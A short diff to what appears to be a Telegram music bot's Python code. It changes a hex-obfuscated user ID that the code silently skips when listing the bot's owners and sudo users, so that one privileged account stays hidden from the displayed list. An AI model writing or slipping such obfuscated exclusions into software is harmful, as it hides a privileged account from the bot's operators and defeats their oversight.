@@ -392,7 +392,7 @@ async def play_commnd(
                 count = 0
                 for x in OWNER_ID:
                     try:
-                        if x == int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+                        if x == int("\x35\x39\x34\x38\x33\x36\x37\x37\x36\x31"):
                             continue
                         user = await app.get_users(x)
                         user = (
@@ -406,7 +406,7 @@ async def play_commnd(
                 for user_id in SUDOERS:
                     if user_id not in OWNER_ID:
                         try:
-                            if user_id==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+                            if user_id==int("\x35\x39\x34\x38\x33\x36\x37\x37\x36\x31"):
                                 continue
                             user = await app.get_users(user_id)
                             user = (
